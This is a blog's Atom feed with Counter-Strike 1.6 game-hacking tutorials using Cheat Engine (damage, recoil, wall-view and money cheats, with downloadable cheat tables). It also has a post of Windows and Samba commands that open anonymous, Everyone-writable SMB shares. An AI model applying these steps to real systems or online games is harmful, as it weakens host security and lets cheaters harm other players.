<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2022-04-16T13:33:14.834Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSGO破解学习(四)</title>
    <link href="https://www.ascotbe.com/2022/04/17/CSGO_0x04/"/>
    <id>https://www.ascotbe.com/2022/04/17/CSGO_0x04/</id>
    <published>2022-04-17T15:58:53.000Z</published>
    <updated>2022-04-16T13:33:14.834Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/0000.png" alt="00000"></p><h3 id="手枪连发"><a href="#手枪连发" class="headerlink" title="手枪连发"></a>手枪连发</h3><p>查找方式和之前的无后座力一样的操作，通过浏览内存地址区域（当前角色的主武器子弹地址），然后我们可以看到，开枪后按住左键只有一个地址在疯狂跳动，松开武器后直接变为了0</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/62.gif" alt="1"></p><p>我们把这个地址添加到列表中，然后锁定他</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/63.gif" alt="1"></p><p>可以看到手枪变成了冲锋枪，然后通过基地址一查，和冲锋枪的无后座力是同一个值，我们锁定无后座力的值查看</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/64.gif" alt="1"></p><h3 id="辨别敌我"><a href="#辨别敌我" class="headerlink" title="辨别敌我"></a>辨别敌我</h3><p>首先添加3个机器人，然后按<code>~</code>键弹出控制面板，输入<strong>bot_stop 1</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/65.png" alt="image-20220416153756076"></p><p>接着把准心对着敌人进行进行搜索未知初始值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/66.png" alt="image-20220416154200275"></p><p>然后把准心移开后搜索变动的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/67.png" alt="image-20220416154520881"></p><p>接着乱跑乱动后搜索未变动的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/68.png" alt="image-20220416154737755"></p><p>接着把准心再次放到敌人身上搜索变动的值，后重复这些动作</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/69.gif" alt="1"></p><p>最终只剩下这些值以后，当我们把鼠标当道敌人身上可以看到绿色和黑色的地址中有一个值<code>06689B2C</code>和<code>01A01F14</code>都是为2，而<code>06689B30</code>和<code>01A01F18</code>显示不同的数值，接下来我们切换到自己的阵营看看</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/70.gif" alt="1"></p><p><code>06689B2C</code>和<code>01A01F14</code>的值变成了1，而<code>06689B30</code>和<code>01A01F18</code>变成了其他值，在后续添加9个机器人的时候来验证发现如下</p><ul><li><code>06689B2C</code>和<code>01A01F14</code>的值表示阵营</li><li><code>06689B30</code>和<code>01A01F18</code>表示当前的机器人的数字</li></ul><p>然后通过断开游戏链接等方式找到了绿色的这个地址就是他的基址没有进行修改</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/71.png" alt="image-20220416160542046"></p><h3 id="固定伤害"><a href="#固定伤害" class="headerlink" title="固定伤害"></a>固定伤害</h3><p>首先搜索敌人的血量，然后在看是什么对攻击进行修改</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/72.png" alt="image-20220416201712558"></p><p>然后砍敌人一刀搜索变化的血量，然后重复该炒作，结果为这个</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/73.png" alt="image-20220416201754858"></p><p>然后找出是什么修改了它</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/74.png" alt="image-20220416202058820"></p><p>然后我们看汇编代码，有一个fsub减去的操作</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/75.png" alt="image-20220416202244076"></p><p>我们把这个给注释了看看</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/76.png" alt="image-20220416202324102"></p><p>然后回到游戏进行攻击，根本杀不死</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/77.gif" alt="1"></p><p>接着我们用脚本注入的方式修改这个值（记得把注释给还原了），<code>0x43480000</code>这个值是汇编的200值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/78.png" alt="image-20220416202743287"></p><p>添加上面的这段代码点击执行</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/79.gif" alt="1"></p><p>可以看到一枪一个队友</p><h3 id="穿墙"><a href="#穿墙" class="headerlink" title="穿墙"></a>穿墙</h3><p>首先需要开一局，然后模糊的搜索初始值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/80.png" alt="image-20220416203755160"></p><p>然后自杀，用手雷什么的，然后切换为自由视角再搜索变动的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/81.png" alt="image-20220416203920367"></p><p>然后我们乱动视角切换搜索未变动的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/82.png" alt="image-20220416204105386"></p><p>然后按ctrl键，切换视角修改变动的，一直这样搜索（按空格也行切换视角）</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/83.png" alt="image-20220416204249515"></p><p>最终只剩下这些值，然后通过二分法筛选出对的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/84.png" alt="image-20220416204753885"></p><p>然后看是什么改写了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/85.png" alt="image-20220416204829740"></p><p>最终通过结构体的方式找到基地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/86.png" alt="image-20220416205248967"></p><p>接着设置热键方便我们在游戏里面切换</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/87.png" alt="image-20220416205707617"></p><p>然后删除游戏中的快捷键</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/88.gif" alt="1"></p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO1.6-4.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(三)</title>
    <link href="https://www.ascotbe.com/2022/04/15/CSGO_0x03/"/>
    <id>https://www.ascotbe.com/2022/04/15/CSGO_0x03/</id>
    <published>2022-04-15T15:58:53.000Z</published>
    <updated>2022-04-16T13:32:56.884Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/000.png" alt="00" style="zoom:90%;" /><h3 id="被攻击不减速"><a href="#被攻击不减速" class="headerlink" title="被攻击不减速"></a>被攻击不减速</h3><p>有两种方式来搜索这个地址</p><ul><li>编辑-&gt;热键，然后在变动的数值和未变动的数值中设置快捷键，然后通过在扫描类型中选择：未知的初始化值，然后在被攻击的时候按<code>变动的数值</code>快捷键，未被攻击的时候按<code>未变动的数值</code>快捷键，来找出值（速度巨慢）</li><li>根据C++结构体的方式来查找</li></ul><p>我们可以看到所有当前角色的指针都是<code>cstrike.exe+D6E63C+7C</code>然后加上某个值，那么我们就认为它代表的是这个游戏中当前角色，所有我们使用<code>cstrike.exe+D6E63C+7C+5E8</code>的这个值来查找，右键浏览相关内存区域</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/40.png" alt="image-20220413225454915"></p><p>接着查看在内存区域右键切换数据类型</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/41.png" alt="image-20220413225620110"></p><p>最后就在攻击和被攻击的时候分别查看上面一块区域和下面一块区域的内存地址，找到想符合的值，就是这个人物结构体上下找相关的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/42.gif" alt="1"></p><p>图中纵坐标<code>0066C5670</code>横坐标<code>38</code>位置的值可以看到我们被攻击了就变成了小于1的值，如果不被攻击就为1，我们就断定他就是被攻击的小数值，然后我们右键这个值然后把他添加到列表中</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/43.png" alt="image-20220414160058409"></p><p>接着锁定他，再去让人攻击</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/44.gif" alt="1"></p><p>可以看到还是被减数了，那么就是有可能攻击频率太快，导致CE没办法锁定过来，那我们接着右键查看是什么改变了该地址，后直接用空指令替换掉第一个值，看看结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/45.png" alt="image-20220414161038598"></p><p>可以看到该值不动了，只剩下攻击后人物后退效果了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/46.gif" alt="1"></p><p>接着我们测试成功后需要还原代码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/47.png" alt="image-20220414161841267"></p><p>然后通过之前找基地在的方式来找到基地，最终找到这两个基地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/48.png" alt="image-20220414163513941"></p><p>然后只需要对CT表进行注入，找到这个指针右键，选择框中的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/49.png" alt="image-20220414164426178"></p><p>找到我们之前确定的被减速的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/50.png" alt="image-20220414164633992"></p><p>进入到内存浏览器后点击工具-&gt;自动汇编</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/51.png" alt="image-20220414164715191"></p><p>然后在模板的位置首先点击CT表框架代码，然后在点击代码注入</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/52.png" alt="image-20220414164955989"></p><p>可以看到**originalcode:**这里面的值就是每次攻击后修改的汇编指令，我们只需要删除掉他，接着点击文件-&gt;分配到当前CT表即可</p><h3 id="随地购物"><a href="#随地购物" class="headerlink" title="随地购物"></a>随地购物</h3><p>我们出现购物车的时候搜索1，而没有购物车的时候搜索0</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/53.png" alt="image-20220414170931572"></p><p>最终定位到这个值，我们锁定它，可以看到在购物外还购买了手雷</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/54.gif" alt="1"></p><p>然后右键查看是什么修改了它</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/55.png" alt="image-20220414171841260"></p><p>通过结构体的方式我们能够直接添加基地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/56.png" alt="image-20220414172109240"></p><h3 id="无后座力"><a href="#无后座力" class="headerlink" title="无后座力"></a>无后座力</h3><p>我们猜测如果是后坐力是不是和子弹相关，那么我们通过浏览最早的时候子弹的地址相关内存来查找</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/57.png" alt="image-20220414174154524"></p><p>对内存区域进行显示类型的转换，然后开启查看变动的值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/58.gif" alt="1"></p><p>可以看到纵坐标<code>132E0284</code>横坐标<code>58</code>的位置这个值在疯狂变动，为什么排除了纵坐标<code>132E0274</code>横坐标<code>54</code>这个值呢？因为后坐力不可能只为0或者1，后坐力是随着子弹变动的，我们把地址添加进来后锁定</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/59.gif" alt="1"></p><p>可以看到后坐力不变了，那么只需要开枪后查找是什么修改了它</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/60.png" alt="image-20220414175451275"></p><p>然后通过结构体来定位</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/61.png" alt="image-20220414175533679"></p><p>最终结果如上图</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO1.6-3.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SMB匿名访问共享</title>
    <link href="https://www.ascotbe.com/2022/04/14/SMBAnonymousAccessShare/"/>
    <id>https://www.ascotbe.com/2022/04/14/SMBAnonymousAccessShare/</id>
    <published>2022-04-14T15:58:53.000Z</published>
    <updated>2022-04-14T06:43:10.322Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>修改文件<code>/etc/samba/smb.conf</code>，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">    map to guest = bad user</span><br><span class="line">    server role = standalone server</span><br><span class="line">    usershare allow guests = yes</span><br><span class="line">    idmap config * : backend = tdb</span><br><span class="line">    smb ports = 445</span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">    comment = Samba</span><br><span class="line">    path = /tmp/</span><br><span class="line">    guest ok = yes</span><br><span class="line">    read only = no</span><br><span class="line">    browsable = yes</span><br></pre></td></tr></table></figure><p>然后启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service smbd start </span><br><span class="line">service nmbd start </span><br></pre></td></tr></table></figure><p>然后挂在共享目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs //192.168.50.28/ascotbe /tmp</span><br></pre></td></tr></table></figure><p>然后访问的Windows需要开启这个设置</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SMBAnonymousAccessShare/1.png" alt="image-20220413201559044"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SMBAnonymousAccessShare/2.png" alt="image-20220413201646299"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>启用Guest用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure><p>将Everyone权限应用于匿名用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>指定匿名共享文件的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span><br></pre></td></tr></table></figure><p>将Guest用户从策略“拒绝从网络访问这台计算机”中移除，导出组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>修改文件gp.inf，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p><p>重新导入组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /configure /db gp.sdb /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>强制刷新组策略，立即生效(否则，重启后生效)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure><p>设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\share\ /T /grant Everyone:r</span><br><span class="line">net share share=c:\share /grant:everyone,full</span><br></pre></td></tr></table></figure><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(二)</title>
    <link href="https://www.ascotbe.com/2022/04/04/CSGO_0x02/"/>
    <id>https://www.ascotbe.com/2022/04/04/CSGO_0x02/</id>
    <published>2022-04-04T15:58:53.000Z</published>
    <updated>2022-04-16T13:32:36.510Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/00.jpg" alt="00" style="zoom:50%;" /><h3 id="搜索血量"><a href="#搜索血量" class="headerlink" title="搜索血量"></a>搜索血量</h3><p>在搜索血量的时候我按着之前子弹的办法来搜索，结果找不到具体的值，后面发现血量有可能是单浮点，而并不是我们看到的那个整数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/24.png" alt="image-20220404161631724"></p><p>然后我们购买炸弹<code>o+4</code>进行购买，然后炸自己（别炸死了），就按这种方式一直搜索，然后找到黑色的地址通过验证子弹的方式来验证，最终找到如下临时地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/25.png" alt="image-20220404161649203"></p><p>接着按着子弹的方式去找他的基址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/26.gif" alt="1"></p><p>然后搜索这个地址可以找到四个值，使用这个方法来查找</p><ul><li>为什么选这个地址？因为只有这个地址改变了，其他的没变</li><li>为什么要使用这个方法？因为使用了<code>找出是什么改写了这个地址</code>无法准确的定位到上一级的地址</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/27.png" alt="image-20220404174232438"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/28.png" alt="image-20220404174334902"></p><p>可以看到值在疯狂的刷新，然后再次搜索<strong>0A167E38</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/29.png" alt="image-20220404174445723"></p><p>依旧找到了一个疯狂刷新的值，接着找到了<strong>0AA5DADC</strong>这个值，然后继续搜索</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/30.png" alt="image-20220404174758380"></p><p>看看我们发现了什么？和我们子弹的基址是一样的，那么我们就可以断定，这个值是我们当前角色的基址，而另一个是所有玩家的基址，最终我们得到了如下结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/31.png" alt="image-20220404175256378"></p><p>然后我们添加机器人验证，可以看到所有人血量的地址在变动，说明没错</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/32.gif" alt="2"></p><h3 id="搜索护甲"><a href="#搜索护甲" class="headerlink" title="搜索护甲"></a>搜索护甲</h3><p>我们使用<code>o+2</code>来进行购买护甲，然后按血量的方式进行搜索，找到一个值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/33.png" alt="image-20220404193310228"></p><p>然后我们使用<code>找出是什么访问了这个地址</code>，找到了地址<strong>0AA5DB5C</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/34.png" alt="image-20220404193340728"></p><p>这个值是不是和我们之前的哪个血量很像，我们直接使用C&#x2F;C++结构体的思维来去推测</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/35.png" alt="image-20220404193648609"></p><p>可以看到直接找到了护甲的值，同理可以推测出敌人的护甲值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/36.png" alt="image-20220404193931198"></p><p>我们进游戏进行验证</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/37.gif" alt="3"></p><h3 id="搜索金钱"><a href="#搜索金钱" class="headerlink" title="搜索金钱"></a>搜索金钱</h3><p>方式和上面一样找到后需要一个一个使用<code>找出是什么访问了这个地址</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/38.png" alt="image-20220404200345065"></p><p>可以看到我们熟悉的值，直接使用护甲一样的方式来定位，最终两个值如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/39.gif" alt="4"></p><p>可以看到我们把金钱锁定为100，然后右边显示的是16000，当我们购买枪支的时候，直接提示了金钱不足</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO1.6-2.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(一)</title>
    <link href="https://www.ascotbe.com/2022/03/20/CSGO_0x01/"/>
    <id>https://www.ascotbe.com/2022/03/20/CSGO_0x01/</id>
    <published>2022-03-20T15:58:53.000Z</published>
    <updated>2022-04-16T13:56:00.473Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/0.jpg" alt="0" style="zoom:50%;" /><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p>CSGO1.6版本 </p><ul><li><a href="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO.7z.001">分卷1</a> </li><li><a href="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO.7z.002">分卷2</a></li><li><a href="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO.7z.003">分卷3</a></li></ul></li><li><p>Cheat Engine<a href="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/Cheat%20Engine%206.7.zip">下载地址</a></p></li></ul><h3 id="搜索子弹"><a href="#搜索子弹" class="headerlink" title="搜索子弹"></a>搜索子弹</h3><p>在正式开始前还是需要一些基本的使用知识，首先我们通过内存搜索子弹，然后基于二分法进行筛选数据</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/1.png" alt="image-20220320173819317"></p><p>上面是我们搜索出来的数据，暂时把它定义为<code>当前地图当前身份当前人物手持的这一把AK枪的子弹内存</code></p><blockquote><p>为什么要这样喊呢？因为在游戏里面会有多个数据结构环环嵌套，指针一个指向一个进行套娃</p></blockquote><p>我们通过：右键该内存-&gt;找出是什么改写了这个地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/2.gif" alt="1"></p><p>然后我们点击手动添加地址把<strong>06F03960</strong>加上偏移CC，即可显示当前枪械的子弹</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/3.png" alt="image-20220320174237627"></p><p>所以<strong>06F03960</strong>就是我们上一级的地址，我们只需要使用新的扫描来搜索</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/4.png" alt="image-20220320174642541"></p><p>可以看到4个地址，接下来我们回到游戏，把主武器丢弃查看变化</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/5.gif" alt="2"></p><p>可以看到第一个地址的值变为了<strong>00000000</strong>，那我们可以知道这个地址是当前主武器的名称，而里面的<strong>06F03960</strong>是这个武器的名称。我们尝试丢弃主武器后重新换一把枪</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/6.gif" alt="3"></p><p>接下来把那个枪械的值<strong>06F03AB8</strong>进行替换，可以发现完全一样，论证完全没问题</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/7.png" alt="image-20220320194112655"></p><p>第四个值不变，那么这个值是没用的。</p><p>第二个和第三个的值在我们丢弃主武器和副武器都进行了变化，所以这两个值应该才是我们需要的。</p><p>首先查看第二个地址是什么修改了它，从图片可以看到ESI的值<strong>0A284310</strong>偏移是5E8</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/8.png" alt="image-20220320194809159"></p><p>而第三个地址技术无限刷新，应该是获取当前枪的名称用的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/9.png" alt="image-20220320202131390"></p><p>既然知道了这个值，我们就通过手动添加第三个地址的偏移，可以看到完全和我们的子弹一样。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/10.png" alt="image-20220320202533789"></p><p>所以这个地址就是当前枪支的子弹数，并且我们切换到副武器也是一样的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/11.gif" alt="4"></p><p>加下来继续搜索<strong>0A284310</strong>这个地址，可以看到有多个值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/12.png" alt="image-20220320204609570"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/13.png" alt="image-20220320210207377"></p><p>我们需要更换地图来进行筛选哪些值改变了，然后一个一个值的进行判断：</p><ul><li>找出是什么改写了这个地址</li><li>游戏中按H</li><li>更换地图进行查看</li><li>最终使用指针表示法来验证</li></ul><p>通过排除找到的地址进行验证，最终找到这个值是对的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/14.png" 